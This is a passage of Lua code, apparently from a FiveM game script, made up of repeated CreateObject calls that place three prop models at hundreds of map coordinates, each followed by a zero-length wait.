        CreateObject(3821613641, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        Citizen.Wait(0)
        CreateObject(3295673357, 289.80303955078, 176.33485412598, 104.16362762451, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 342.82180786133, 109.17627716064, 102.25390625, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 311.09707641602, -0.66867196559906, 80.478523254395, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 258.19369506836, -148.08422851562, 63.999645233154, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 190.13160705566, -307.9919128418, 44.129356384277, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 152.85752868652, -413.20791625977, 41.093223571777, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 110.89814758301, -559.67547607422, 31.626415252686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 44.002738952637, -739.80334472656, 31.767831802368, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -36.021713256836, -931.66741943359, 29.320764541626, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -94.51407623291, -1157.5056152344, 25.760782241821, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
